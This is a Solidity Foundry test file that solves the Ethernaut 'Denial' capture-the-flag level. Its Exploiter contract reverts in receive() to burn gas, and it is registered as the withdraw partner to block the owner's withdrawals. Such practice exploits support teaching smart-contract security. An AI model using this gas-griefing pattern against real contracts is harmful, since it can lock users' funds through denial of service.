// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Denial.sol";
import "src/levels/DenialFactory.sol";

contract Exploiter {
    uint256 private sum;

    function withdraw(Denial _victim) public {
        _victim.withdraw();
    }

    receive() external payable {
        // run out of gass
        assert(false);
    }
}

contract TestDenial is BaseTest {
    Denial private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DenialFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Denial(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(player);

        Exploiter exploiter = new Exploiter();

        level.setWithdrawPartner(address(exploiter));

        vm.stopPrank();
    }
}
